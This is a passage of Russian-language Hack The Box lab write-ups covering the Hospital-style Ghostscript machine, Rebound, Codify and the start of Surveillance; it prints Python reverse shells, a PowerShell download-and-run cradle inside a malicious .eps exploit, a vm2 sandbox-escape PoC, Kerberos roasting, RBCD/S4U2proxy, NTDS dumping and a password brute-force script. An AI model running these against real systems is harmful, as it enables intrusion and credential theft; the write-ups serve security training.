В таких случаях можно использовать проверенный вариант — p0wny-shell,
минималистичный шелл на PHP. Сразу заг ружа ем файл как .phar и перехо-
дим на страницу с шеллом.





                                 p0wny-shell

Хоть это и красиво, но реверс-шелл всегда удоб нее.




Об ратный шелл — это подклю чение, которое активиру ет атакуемая машина,
а мы принимаем и таким образом подключаем ся к ней, чтобы выполнять
коман ды от лица поль зователя, запустивше го шелл. Для приема соеди нения
необходимо создать на локальной машине listener, то есть «слу шатель».


Запускаем листенер  (pwncat-cs  -lp  4321) и выполняем реверс-шелл
на Python:


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.73",4321));os.dup2(
s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
pty; pty.spawn("bash")'





                  Сессия поль зователя www-data




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



       ПОЛУЧАЕМ ДОСТУП К ХОСТУ ЧЕРЕЗ
            УЯЗВИМОСТЬ GHOSTSCRIPT





ÏÐÎÄÂÈÆÅÍÈÅ

Ïîâûøåíèå ïðèâèëåãèé â Docker
Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрипт из набора PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе будет мно го информа ции, поэтому пройдем ся толь-
ко по самым важным моментам.
  В системе два пользователя с консолью: root и drwilliams.





                      Поль зователи системы

Также нашелся пароль от MySQL.





                       Найден ные пароли

Больше ничего интересного извлечь не удалось, однако следует протес-
тировать последние экспло иты повышения привиле гий. Первым в очереди,
конечно, будет GameOverlay, который мы подробно рассматривали в райтапе
по машине Analytics.





                        За пуск эксплоита

Так все го в одну команду получа ем привилегии рута в Docker.


docker root → drwilliams
Первым делом откры ваем охоту за учетными данными. Так как у нас есть при-
вилегии рута, мы можем взять и прочитать хеши паролей пользователей
из фай ла /etc/shadow.





                Содержимое фай ла /etc/shadow

Для перебо ра хеша с помощью hashcat нужно знать соот ветству ющий алго-
ритму хеширования режим. Получить его можно из справ ки программы.


hashcat --example | grep '\$6\$' -B6 -A6





                         Справка hashcat

А теперь перебираем пароль, указывая режим в параметре -m.


hashcat -m 1800 hash.txt rockyou.txt





                    Ре зультат перебо ра пароля

По лучаем учетные данные и с ними можем вой ти в почту пользователя. Там
находим входящее сообщение.





                       Входящее сообщение

Поль зователь ожи дает файл Ghostscript с расширением .eps.


drwilliams → drbrown
Первым делом стоит проверить, есть ли для обнаруженной технологии
готовые экспло иты. Самый прос той способ — поискать в Google.





                   По иск экспло итов в Google

Вторая ссылка указыва ет на свежую уязвимость CVE-2023-36664. Ghostscript
до 10.01.2 неп равиль но обра батывает проверку раз решений, из-за чего воз-
можно внедрение команд. В качестве выполняемой команды будем исполь-
зовать самый типичный заг рузчик на PowerShell:


IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.
73/rs.txt')

Этот загрузчик скачает с нашего веб-сервера реверс-шелл и выпол нит его
сра зу в памяти.
  Запускаем веб-сер вер:


python3 -m http.server 80

Для начала просто проверим, при дет ли зап рос.
  Все  прош ло  успешно.  Теперь  запус каем  генератор,  получен ный
из репозитория. Этот генератор сделает специаль ный файл, экс плуати-
рующий уязвимость.


python3 CVE_2023_36664_exploit.py --inject --payload "powershell -c "
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.
73/rs.txt')"" --filename rs.eps



                      Генерирование нагрузки

Отправ ляем  пользователю  сгенерирован ный  файл  и  ждем  запрос
на веб-сер вер.





                        Поч товый клиент





                      Ло ги веб-сервера

Зап рос  при шел,  а  зна чит, можно  выполнять  реальный  реверс-шелл.
Для  получе ния пол ноценной коман дной оболочки будем  исполь зовать
ConPtyShell. Только в конец фай ла нужно дописать команду со своими
парамет рами Invoke-ConPtyShell 10.10.16.73 443.





                        Код реверс-шелла

В новом терминале запускаем листенер:


stty raw -echo; (stty size; cat) | nc -lvnp 443

И повторяем отправ ку фай ла. Спустя некоторое вре мя получаем сес сию
нового поль зователя.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Те перь исполь зуем исполняемый файл PEASS для разведки в Windows.
Информации снова очень много, отбираем ту, что име ет значение.
  Воз можна атака DLL Hijacking для Apache.





                 Список поль зователь ских служб

Есть пра во записи в каталог C:\xampp.





                   Список установленного ПО

Ес ли у нас получится записать веб-шелл в каталог веб-сервера XAMPP, то мы
добьемся выполнения кода от имени SYSTEM. Проверим воз можность
записи в каталог и доступность записанного фай ла.





                     Запись фай ла в каталог





                 По лучение содер жимого фай ла

Те перь просто заг ружаем в тот же каталог уже использованный ранее
веб-шелл, переходим на страницу через браузер и забира ем флаг адми нис-
тратора.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня нач нем с типичных (и не очень)
атак  AS-REP  Roasting  и  Kerberoasting.
Затем покопаемся в базе LDAP и най дем
неочевидный      путь     продвижения.
При получении доступа к хосту используем             RalfHacker                                                                                             hackerralf8@gmail.com
тех нику RemotePotato, а для повыше ния
привилегий — тех нику S4U2proxy.


Наша цель — получение прав суперпользователя на машине Rebound с учеб-
ной площадки Hack The Box. Уро вень ее слож ности — «безумный».




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.231    rebound.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел мно жество открытых портов, что характерно для серверов
на Windows:
 • 53 — DNS;
 • 88 — Kerberos;
 • 135 — служба удаленного вызова про цедур (Microsoft RPC). Используется
   для опе раций взаимо дей ствия контроллер — контроллер и контроллер —
   кли ент;
 • 139 — служба сеан сов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба сме ны пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — использует ся в служ бах DCOM и Exchange;
 • 636 — LDAP с шиф рованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от кли ента к контроллеру;
 • 5985 — служба удаленного управления WinRM.

Первым делом проверя ем, нет ли воз можности анонимного входа, и выводим
спи сок общих каталогов. Для это го используем утилиту CrackMapExec,
которая нам еще не раз при годится при про хождении.


crackmapexec smb rebound.htb -u guest -p '' --shares





                   Общие SMB-катало ги

Видим нестандартный каталог Shared. Подклю читься и просмотреть содер-
жимое можно с помощью скрипта из набора impacket.


impacket-smbclient guest@rebound.htb





                 Содержимое каталога Shared

Но каталог оказался пустым, поэтому переходим к дру гим техникам.


ÒÎ×ÊÀ ÂÕÎÄÀ

Так как дос тупна анонимная аутентифика ция на ресурсе SMB, можно проб-
рутить RID и получить наз вания групп и имена пользователей.


crackmapexec smb rebound.htb -u guest -p '' --rid-brute 10000





                Имена поль зователей и груп пы

Те перь,  когда  у нас есть имена пользователей, мы можем пос преить
популярные пароли и проверить AS-REP Roasting.


AS-REP Roasting
Смысл ата ки AS-REP Roasting в том, что мы посылаем на сервер аутен-
тификации ано нимный запрос для предоставления определенному поль-
зователю дос тупа к какой-либо услуге. На что сервер имеет три разных отве-
та:
 • предоставляет билет, отку да мы возьмем хеш;
 • от веча ет,   что   у   данного   пользователя   не   выс тавлен   флаг
  PreauthNotRequired;
 • говорит, что такого пользователя нет в базе Kerberos.

Проделать все это мож но при помощи все того же CrackMapExec.


crackmapexec ldap rebound.htb -u users.txt -p '' --asreproast
asreproast_hashes.txt



                   Результат проведения атаки

Таким образом, в домене есть один пользователь, для которого не тре буется
предварительная аутентификация Kerberos, и мы получаем хеш его пароля.
Для брута пароля в hashcat ука зываем режим 18200 (параметр -m).


hashcat -m 18200 asreproast_hashes.txt rockyou.txt

Пе ребор хеша с помощью hashcat никаких резуль татов не дал.


Kerberoasting
Ре ализация протокола Kerberos в Windows использует имена учас тников
службы (SPN) для определения того, какую учетную запись задей ство вать
для шифрования билета службы. В Active Directory существу ет два варианта
SPN: SPN на основе хоста и произвольные SPN. Пер вый вари ант SPN связан
с учетной записью компьюте ра домена, а второй обычно (но не всегда) —
с учеткой поль зователя домена.
  Проще говоря, если зап рошен билет, он шиф руется паролем учетной
записи, которая пре доставила его SPN. Так, если мы получим билет, мы
можем его прос то пробрутить, чтобы узнать пароль учетки! Хотя для это го
и нужно пройти аутентификацию, но мы можем взять пользователя с прош-
лого эта па, для которо го она не требуется. В этом вари анте выпол нить ата ку
можно с помощью Rubeus, для чего перей дем в виртуал ку с Windows.


Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:10.
10.11.231 /spns:users.txt /ldaps /nowrap





                   Результат выполнения атаки

По лучаем хеши поль зователей ldap_monitor и delegator$, которые сразу
отправ ляем на брут в hashcat.


hashcat -m 13100 kerberoasting_users.txt rockyou.txt





                     Результат взлома хешей

По лучаем пароль для учетки ldap_monitor. Наш единственный пароль спре-
им по остальным учет кам и получа ем еще одну валид ную пару из логина
и пароля — для поль зователя oorend.


crackmapexec smb 10.10.11.231 -u users.txt -p '1GR8t@$$4u'
--continue-on-success





                     Результат спрея пароля


ÒÎ×ÊÀ ÎÏÎÐÛ

Те перь, когда  у нас есть валидные учетные записи, собираем данные
для BloodHound. Для этого используем скрипт на Python. Но сначала обновим
запись в файле /etc/hosts и синхронизируем вре мя с удаленным хостом.


10.10.11.231 rebound.htb dc01.rebound.htb


sudo timedatectl set-ntp false
sudo ntpdate -s 10.10.11.231


bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -ns 10.10.11.231 -d
 rebound.htb  -c All





                    Сбор данных BloodHound

Отмечаем под кон трольных нам пользователей как Owned и проводим анализ.
Но к сожале нию, ничего интерес ного най ти не уда лось. Тогда попробу ем
сдампить базу LDAP и проверить разрешения вручную. Для работы с LDAP я
использую скрипт bloodyAD.


python3 bloodyAD.py -u ldap_monitor -d rebound.htb -p '1GR8t@$$4u'
--host rebound.htb get search 'DC=rebound,DC=htb' --resolve-sd >
ldap_dump.txt

База сох ранена в файл ldap_dump.txt, из которого отфильтру ем все строки,
содержащие име на и SID под кон троль ных пользователей.


cat ldap_dump.txt | grep -i 'ldap_monitor\
|S-1-5-21-4078382237-1492182817-2568127209-7681\|oorend\
|S-1-5-21-4078382237-1492182817-2568127209-7682'





                    Вывод команды grep

Так как нас интересуют только разрешения, остановим ся на первой строке
вывода. Открываем тексто вый редактор и находим ее через поиск. Этот ACL
относится к объекту ServiceMgmt.





                 LDAP записи объ екта ServiceMgmt

Таким образом, пользователь oorend (SID S-1-5-21-40...7682) может
добавлять  поль зовате лей  в  груп пу  ServiceMgmt. Пометим  эту  группу
как Owned и для поиска дальнейшего пути сно ва попыта ем удачу в графе
BloodHound, на этот раз успешно.





                       Граф BloodHound

У пользователей этой группы есть все права на подразделение SERVICE
USERS, к которому относится юзер winrm_svc. Зна чит, можно взять под кон-
троль пользователя winrm_svc в три этапа.
  Ýòàï ïåðâûé. Добавить пользователя oorend в груп пу ServiceMgmt.


python3 bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host
rebound.htb add groupMember ServiceMgmt oorend



               До бавление поль зователя в груп пу

Ýòàï âòî ðîé. Добавить поль зовате лю oorend все права на членов под-
разделения SERVICE USERS.


python3 bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host
rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB'
oorend


                  Добавление прав на объект

Ýòàï òðå òèé. Установить пользователю winrm_svc свой пароль.


python3 bloodyAD.py -u oorend -d rebound.htb -p '1GR8t@$$4u' --host
rebound.htb set password winrm_svc 'Ralf!@34'



                 Смена пароля поль зователя

А теперь исполь зуем уста новленные учетные данные для авторизации в служ-
бе WinRM.


evil-winrm -i rebound.htb -u winrm_svc -p 'Ralf!@34'





                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



          ПРОВОДИМ СЛОЖНУЮ АТАКУ
                 НА ACTIVE DIRECTORY





ÏÐÎÄÂÈÆÅÍÈÅ

Îò WINRM_SVC ê TBRADY
Для разведки на хос те можно использовать утилиту Seatbelt. Пос ледова-
тель но собираем информацию о системе, пользователе и другие интересные
вещи.


Seatbelt.exe -group=system
Seatbelt.exe -group= user
Seatbelt.exe -group= misc





                         OneNote-фай лы

Из интересного в пункте, свя занном с файлами OneNote, отмечаем наличие
воз можности вхо да в систему у пользователя tbrady. Про верить наличие
текущей  сессии  не  получилось,  поэтому  я  решил  использовать
RemotePotato0 всле пую. Подробнее об этой  технике можешь почитать
в  статье  «Кар тошка-0.  Повышаем  привилегии  в  AD  при  помощи
RemotePotato0». В результате атаки мы получим NetNTLMv2-хеш ата куемого
поль зовате ля. На своем хосте запускаем редиректор socat, а на удаленной
машине выпол няем RemotePotato0.


sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:rebound.htb:9999


RemotePotato0.exe -m 2 -r 10.10.16.34 -x 10.10.16.34 -p 9999 -s 1





                        Результат ата ки

По лученный хеш отправляем в hashcat. Хеши такого типа (-m 5600) брутятся
очень быстро, и в резуль тате мы получа ем пароль пользователя.


hashcat -m 5600 -a 0 tbrady_hash.txt rockyou.txt




                    Результат перебора хеша

Ко неч но  же,  проверяем  полученные  учетные  данные  с  помощью
CrackMapExec.


crackmapexec smb 10.10.11.231 -u tbrady -p '543BOMBOMBUNmanda'



              Проверка учетных данных пользователя


Îò TBRADY ê DELEGATOR
Так как мы получи ли нового пользователя, возвращаем ся к графу BloodHound
и помечаем эту учет ку, после чего перестра иваем граф.





                       Граф BloodHound

У этого поль зовате ля есть право на чтение паролей gMSA. Óïðàâëÿåìûå
ó÷åòíûå çàïèñè (MSA) — это специальный тип учетных записей Active
Directory. Их можно использовать для безопас ного запус ка служб, приложе-
ний и заданий пла нировщика. Основная идея в том, что паролем таких учет-
ных записей пол ностью управля ет Active Directory. Для них автомати чески
генери руется сложный пароль дли ной 240 сим волов, который меняется так же
авто мати чески каждые 30 дней. Для аутен тификации исполь зуется только
Kerberos, так как интерак тивный вход для этих уче ток невозможен. Это свя-
зано с тем, что пароль не известен никому и не хранится в локальной сис-
теме, поэтому его нельзя извлечь из системного про цесса LSASS с помощью
mimikatz.
  Но и такими учетными записями нужно как-то управлять, а это значит, что,
если у нас есть доступ к такой учетке, мы можем получить хеш ее пароля.
Для этого мы снова будем использовать CrackMapExec.


crackmapexec ldap dc01.rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k
--gmsa




             Получение хеша учетной записи delegator$

Так мы получаем под контроль еще одну учетную запись и идем даль ше.


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Больше BloodHound новых гра фов не перестраивает, поэтому прос матри-
ваем информа цию о пользователе. У этой учетки есть запись в атри буте
msDS-AllowedToDelegateTo (свойство allowedtodelegate в BloodHound).





                  Информация о пользователе

Этот атри бут содержит список SPN (служб), для которых учетная запись
может запрашивать TGS от име ни кли ента. Так как предстоит поработать
с Kerberos, изме ним запись в файле /etc/hosts.


10.10.11.231 rebound.htb dc01.rebound.htb dc01

По лучим TGT для текущей учетной записи и проверим все делегирования
в домене. Для всех операций используем скрип ты impacket.


impacket-getTGT 'rebound.htb/delegator$@dc01.rebound.htb' -hashes :
9b0ccb7d34c670b2a9c81c45bc8befc3 -dc-ip 10.10.11.231




                       По лучение TGT


export KRB5CCNAME='delegator$@dc01.rebound.htb.ccache'
impacket-findDelegation rebound.htb/ -k -no-pass





                Проверка делеги рований в домене

Таким обра зом нам удалось найти единственное ограниченное делегирова-
ние. Но в кон тексте целево го пользователя для выполнения атаки нам пот-
ребуется третья вспо могатель ная учетная запись. Можно взять уже под кон-
трольную нам либо создать новую, благо по умолчанию каж дый пользователь
домена может соз дать до десяти учетных записей машин. Но так как в некото-
рых доменах такое разрешение может быть огра ничено, стоит проверить,
есть ли оно. Для это го проверим значение MachineAccountQuota в домене.


crackmapexec ldap dc01.rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -k
-M MAQ




                 Проверка MachineAccountQuota

И мы как раз находимся в домене, где нельзя соз давать дополнительные
учетные  записи. Поэтому  в  качестве вспо могательной заюзаем  учетку
ldap_monitor. Настроим RBCD от вспо могательной учетной записи к учет-
ной записи с ограниченным делегирова нием.


impacket-rbcd -delegate-from ldap_monitor -delegate-to 'delegator$'
-dc-ip 10.10.11.231 -action write 'rebound.htb/delegator$' -k
-no-pass -use-ldaps





                        Настройка RBCD

Так  как теперь нам пред стоит работать через ldap_monitor, получим
и экспортируем TGT.


impacket-getTGT 'rebound.htb/ldap_monitor:1GR8t@$$4u' -dc-ip 10.10.
11.231
export KRB5CCNAME=ldap_monitor.ccache





                       По лучение TGT

Для дальнейшей атаки нам нужен SPN учет ной записи с огра ниченным
делегированием.





                  Информация о пользователе

Те перь проведем полную ата ку S4U2 и получим TGS с возможностью
пересылки для учет ной записи с настро енным ограниченным делегирова-
нием browser/dc01.rebound.htb.


impacket-getST -spn browser/dc01.rebound.htb -impersonate 'dc01$'
rebound.htb/ldap_monitor -dc-ip 10.10.11.231 -k -no-pass





                       Получение TGS

Те перь исполь зуем S4U2proxy с возможностью пересылки TGS из предыду-
щего шага и получаем TGS для конеч ной службы http/dc01.rebound.htb.


export KRB5CCNAME= dc01\$.ccache
impacket-getST -spn http/dc01.rebound.htb -impersonate 'dc01$'
-additional-ticket 'dc01$.ccache' 'rebound.htb/delegator$' -hashes :
9b0ccb7d34c670b2a9c81c45bc8befc3





                       Получение TGS

Пришло вре мя экспортировать полученный билет, и, так как мы имперсониру-
ем учет ную запись dc01$, сдам пим базу NTDS.


export KRB5CCNAME= dc01\$.ccache
impacket-secretsdump dc01.rebound.htb -k -no-pass -just-dc-ntlm





                         Учетные данные домена

И с хешем администратора авто ризуемся в службе WinRM для получения пос-
ледне го флага.


evil-winrm -i rebound.htb -u Administrator -H
176be138594933bb67db3b2572fc91b8





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как совершить
побег из песочницы vm2. Затем получим
RCE  на  сервере,  найдем  базу  данных
и извле чем из нее учетные данные. А для
повыше ния привилегий нам пред сто ит про-             RalfHacker                                                                                             hackerralf8@gmail.com
экс плуатировать   уязвимость   в   поль-
зовательском скрипте на Bash.


Наша цель — получение прав суперпользователя на машине Codify с учебной
пло щадки Hack The Box. Уровень сложности машины — легкий.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.239    codify.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел три открытых пор та:
 • порт 22 — служба OpenSSH 8.9p1;
 • порт 80 — веб-сервер Apache 2.4.52;
 • порт 3000 — при ложение Node.js Express.

По списку открытых портов понятно, что для получения доступа к сер веру нуж-
но най ти и про эксплуатировать уяз вимость на сайте (бру тить пароль от SSH
на HTB не при нято).





                    Главная страница сайта codify.htb

Сайт позволя ет протестировать код Node.js в изолиро ванной среде прямо
на сай те.





                      Ре дак тор кода Node.js


ÒÎ×ÊÀ ÂÕÎÄÀ

На странице About us есть информация о редакторе кода. Для исполнения он
использует JavaScript-песочницу vm2.





                Со держимое стра ницы About us

Ссылка на сай те ведет не на самую пос леднюю вер сию библиоте ки vm2, а на
версию 3.9.16, которая, вероятно, и используется на сер вере.
  Первым делом сто ит про верить, есть ли для обна руженной версии
готовые экс пло иты. Для это го можно исполь зовать Google или сразу заг-
лядывать в спе циализированные базы дан ных вроде HackerOne и Exploit-DB,
а также на GitHub. На пос леднем ресурсе и находим упоминание уяз вимости
CVE-2023-37466, которой под вержена используемая версия vm2.





                    Описание репози тория

По идентифика тору уязвимос ти находим PoC, который поз воляет выйти
из песоч ницы и выполнить указанные коман ды непосредс твенно в системе.
В качестве теста запустим на локальном хос те листенер  (nc  -lvp  80)
и выполним на уда лен ном сервере зап рос с помощью curl.


const {VM} = require("vm2");
const vm = new VM();


const code = `
async function fn() {
   (function stack() {
       new Error().stack;
       stack();
   })();
}
p = fn();
p.constructor = {
   [Symbol.species]: class FakePromise {
       constructor(executor) {
           executor(
               (x) => x,
               (err) => { return err.constructor.constructor('return
process')().mainModule.require('child_process').execSync('curl 10.10.
16.116/test_rce'); }
           )
       }
   }
};
p.then();
`;


console.log(vm.run(code));





                         Редактор кода





                       Логи листенера

Ко ман да была выполнена, а зна чит, можно заг рузить реверс-шелл.




Об ратный шелл — это подклю чение, которое активиру ет атакуемая машина,
а мы при нима ем его и таким образом подклю чаем ся к ней, чтобы выполнять
коман ды от лица поль зователя, запустивше го шелл. Для приема соеди нения
необходимо создать на локальной машине listener, то есть «слу шатель».


Запускаем листенер:


pwncat-cs -lp 4321

На удаленном сер вере командой curl http://[address] | bash соз даем
реверс-шелл на Python:


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.116",4321));os.dup2(
s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
pty;pty.spawn("bash")'

Так мы получаем доступ к системе.





                        Сессия pwncat


ÏÐÎÄÂÈÆÅÍÈÅ

Дальше нам нуж но поднять привиле гии и для начала хотя бы получить логин
и пароль для вхо да по SSH. А для этого понадобит ся соб рать информацию
о системе. Я, как обычно, буду использовать скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Что бы загрузить скрипт на удаленный сервер с помощью pwncat-cs, сначала
ком бинаци ей Ctrl-D нуж но вый ти в главное меню программы, затем исполь-
зовать команду upload [src] [dst] для переноса скрипта и командой back
вернуться обратно в сес сию с командной оболочкой. Осталось написать
chmod +x linpeas.sh, что бы дать пра во на выполнение, и запустить ска-
нирование. В выводе будет мно го информации, поэтому отбе рем только
самое важное.
  В спис ке откры тых портов отмечаем дефолтный для службы MySQL
порт 3306.





                    Список активных пор тов

В списке файлов баз данных есть дос тупная база SQLite /var/www/contact/
tickets.db.





                   Список файлов баз дан ных

Открываем файл базы данных SQLite и находим в нем имя пользователя
и хеш его пароля.





                 Содержимое файла tickets.db

Сра зу отправим хеш на перебор, но сперва нужно узнать, какой алгоритм был
использован. Сде лать это можно, поис кав хеш по справке hashcat вот такой
коман дой:


hashcat --example | grep '\$2a\$12' -B12 -A1





                         Справка hashcat

Ис поль зован алго ритм bcrypt. Как я недавно узнал, при переборе хешей
для некоторых алгорит мов лучше использовать John the Ripper вместо
hashcat, и bcrypt — как раз в числе таких алго ритмов.


john --wordlist=rockyou.txt hashes.txt --format=bcrypt





                      Результат взло ма хеша

По лученные учетные дан ные можно использовать для авторизации по SSH.
Так забираем первый флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Так как разведку на хосте мы уже про водили, заново запускать ска ниру ющие
скрип ты смысла нет, нужно лишь при цель но про верить нес колько мест. Пер-
вое, что нужно про верять в таких слу чаях, — это настройки sudoers. Пос-
мотреть их можно командой sudo -l.





                       Настройки sudoers




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.



Су дя по содер жимому, можно без вво да пароля выполнить скрипт /opt/
scripts/mysql-backup.sh в привилегированном контексте, то есть от име ни
поль зовате ля root. Просмотрим, что делает этот скрипт.





               Содержимое фай ла mysql-backup.sh

При запуске скрипт зап росит пароль пользователя root. Введенный пароль
сравнива ется с тем, что записан в фай ле /root/.creds. Если пароль верный,
будет сделан запрос к базе данных. Но проблема в том, что в случае Bash
при сравнении опе ратором == мы можем исполь зовать * как символ регуляр-
ного выраже ния.





                       Тестовый запуск скрип та

Таким образом, можно посимвольно переб рать пароль, используя для неиз-
вестной части символ *. К при меру, для пароля pass введенная стро ка p*
пройдет срав нение, а c* нет. Для автоматичес кого перебора будем исполь-
зовать Python и отбрасывать варианты, в ответе которых есть строка
Password confirmation failed.





                        Тестирование скрипта

Пос ле получения каждого нового вер ного сим вола пароля будем проверять,
не подойдет ли соб ранная стро ка без символа *. Если в ответе будет строка
Password confirmed, значит, мы нашли верный пароль.


import subprocess
import string


chars = string.digits + string.ascii_letters
root_pass = ""


found = False


for i in range(50):
  for c in chars:
    cmd = f"echo '{root_pass}{c}*' | sudo /opt/scripts/mysql-backup.
sh"
    out = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
stderr=subprocess.PIPE, text=True).stdout
    if "Password confirmation failed" not in out:
      root_pass += c
      print(root_pass)


      cmd = f"echo '{root_pass}' | sudo /opt/scripts/mysql-backup.sh"
      out = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
stderr=subprocess.PIPE, text=True).stdout
      if "Password confirmed" in out:
        print(f"Password found: '{root_pass}'")
        exit()





                    Ре зультат перебо ра пароля

Мы получаем пароль и можем зайти от имени рута и заб рать последний флаг.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу про цесс экс плу-
атации RCE-уяз вимости в сис теме управле-
ния кон тентом ZoneMinder, но сна чала про-
ведем атаку на другую CMS — Craft —
и покопаемся в ее базе дан ных. В конце             RalfHacker                                                                                             hackerralf8@gmail.com
повысим  привилегии  через  инъ екцию
команд ОС.


Наша цель — получение прав суперпользователя на машине Surveillance
с учебной пло щадки Hack The Box. Уровень сложности — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.245    surveillance.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб-сервер Nginx 1.18.0.

На SSH без  учетных данных делать  нечего, поэтому сразу проходим
к веб-серверу, обра тив шись к адресу surveillance.htb через браузер.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

На странице находим помет ку Powered by, из которой мы выясняем, что име-
ем дело с про дуктом CMS Craft. При этом ссылка ведет к проекту на GitHub,
благодаря чему узнаём и версию — 4.4.14.





                        Главная стра ница сай та

Это далеко не пос ледняя версия, а зна чит, с большой вероятностью в ней
с момента релиза нашли уяз вимости. Первым делом отправляемся искать
готовые экспло иты в Google.





                   По иск экспло итов в Google

Первая ссылка выводит на эксплоит для уяз вимости CVE-2023-41892. Из-за
неп равильной обра ботки дан ных можно передать и выполнить PHP-объект,
то есть про эксплуати ровать RCE.





                  Резуль тат выполнения эксплоита

